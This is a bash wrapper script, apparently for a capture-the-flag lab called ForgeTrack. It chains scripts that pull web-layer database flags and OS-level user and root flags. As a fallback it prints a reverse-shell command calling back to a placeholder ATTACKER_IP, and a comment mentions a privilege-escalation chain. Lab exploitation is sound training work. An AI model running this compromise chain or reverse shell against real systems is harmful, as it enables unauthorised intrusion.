#!/usr/bin/env bash
#
# One-shot flag collector for an authorised ForgeTrack lab.
# Runs the web-flag script, then the direct OS-flag script.
#
# Usage:
#   bash get-all-flags.sh http://VM_IP
#   BASE_URL=http://VM_IP bash get-all-flags.sh
#
# Optional: after this succeeds, run get-reverse-shell.py to demonstrate the
# interactive foothold and privesc chain.

set -uo pipefail

BASE="${1:-${BASE_URL:-http://127.0.0.1}}"
BASE="${BASE%/}"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "############################################################"
echo "# ForgeTrack flag collector - target: $BASE"
echo "############################################################"

echo
echo "== WEB LAYER (4 database flags) =="
bash "$HERE/get-web-flags.sh" "$BASE" || echo "WARNING: web flag collection had errors."

echo
echo "== OS LAYER (user.txt + root.txt) =="
if ! bash "$HERE/get-os-flags.sh" "$BASE"; then
  echo "WARNING: OS flag collection failed. Try the interactive route:"
  echo "  python3 $HERE/get-reverse-shell.py $BASE --attacker ATTACKER_IP"
  exit 1
fi

echo
echo "All flag scripts finished."
